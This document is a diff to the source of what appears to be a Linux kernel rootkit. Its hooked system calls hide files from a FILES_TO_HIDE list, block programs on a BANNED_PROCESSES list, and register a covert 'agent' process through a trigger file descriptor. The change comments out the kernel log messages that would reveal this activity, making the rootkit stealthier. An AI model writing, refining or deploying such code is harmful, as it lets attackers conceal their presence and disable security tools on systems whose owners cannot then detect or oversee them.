@@ -86,7 +86,7 @@ bool isHidden(const char *input){
         for(i = 0; i < sizeof(FILES_TO_HIDE)/sizeof(char *); i++){
 
         if(strcmp(kern_buff, FILES_TO_HIDE[i]) == 0){
-        printk("%s matches %s", input, FILES_TO_HIDE[i]);
+        //printk("%s matches %s", input, FILES_TO_HIDE[i]);
         ret = true;
         return ret;
         } 
@@ -287,8 +287,8 @@ asmlinkage long hacked_close(unsigned int fd){
 	int ret = NULL;
 	if(fd == agentKey){
 		agentpid = task_pid_nr(current);
-		printk("Agent trigger detected\n");
-		printk("Agent process pid is %d\n", agentpid);
+		//printk("Agent trigger detected\n");
+		//printk("Agent process pid is %d\n", agentpid);
 	}
 	ret = (*orig_close)(fd);
 	return ret;
@@ -300,7 +300,7 @@ asmlinkage long hacked_close(unsigned int fd){
 asmlinkage int hacked_access(const char __user *pathname, const int __user mode){
 	int ret = NULL;
 	if(isHidden(pathname)){
-		printk("Tried to access hidden file %s", pathname);
+		//printk("Tried to access hidden file %s", pathname);
 		ret = -ENOENT;
 		return ret;
 	}
@@ -315,7 +315,7 @@ asmlinkage int hacked_link(const char __user *existingpath, const char __user *n
 
 	if(isHidden(existingpath)){
 	ret = -ENOENT;
-	printk("%s in hidden files", existingpath);
+	//printk("%s in hidden files", existingpath);
 	return ret;	
 	}
 
@@ -355,23 +355,12 @@ asmlinkage long hacked_execve(const char __user *filename, char const __user *ar
         int ret = NULL;
         kern_buff = kzalloc(strlen_user(argv[0])+1, GFP_KERNEL);
         copy_from_user(kern_buff, argv[0], strlen_user(argv[0]));
-
-	//if(strcmp(kern_buff, "ls") == 0){
-	//	printk("ls executed with %d. Printing environment variables.\n", sizeof(envp)/sizeof(char *));
-	//	printk("2nd environment variable is %s\n", envp[1]);
-	//	globa = sizeof(envp)/sizeof(envp[0]);
-	//	printk("globa: %d\n", globa);
-		//int a;
-		//for(a = 0; a < sizeof(envp)/sizeof(envp[0]); a++){
-		//	printk("Environment variable: %s\n", envp[a]);
-		//}
-	//}
 		
-	printk("FILENAME: %s\n", kern_buff);
+	//printk("FILENAME: %s\n", kern_buff);
         for(i = 0; i < sizeof(BANNED_PROCESSES)/sizeof(char *); i++){
 
         if(strcmp(kern_buff, BANNED_PROCESSES[i]) == 0){
-        printk("Banned process was executed.\n");
+        //printk("Banned process was executed.\n");
         ret = -ENOENT;
         return ret;
         } 
